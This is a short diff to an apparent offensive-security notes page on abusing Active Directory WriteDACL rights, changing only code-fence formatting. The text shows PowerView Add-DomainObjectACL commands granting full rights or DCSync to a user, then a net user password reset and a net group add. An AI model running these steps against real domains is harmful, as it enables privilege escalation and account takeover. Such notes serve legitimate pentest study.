@@ -29,14 +29,14 @@ net group testgroup userA /add /domain
 You can abuse the WriteDACL permission by using the `Add-DomainObjectACL` powerview method to add Generic all to this. If this DACL is the domain object, you can add DC Sync `Add-DomainObjectACL -TargetIdentity (object) -PrincipalIdentity offsec -Rights all`
 
 {% code overflow="wrap" %}
-```
+```powershell
 Add-DomainObjectACL -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights all
 ```
 {% endcode %}
 
 now you can change its password
 
-```
+```powershell
 net user testservice2 password1 /domain
 ```
 
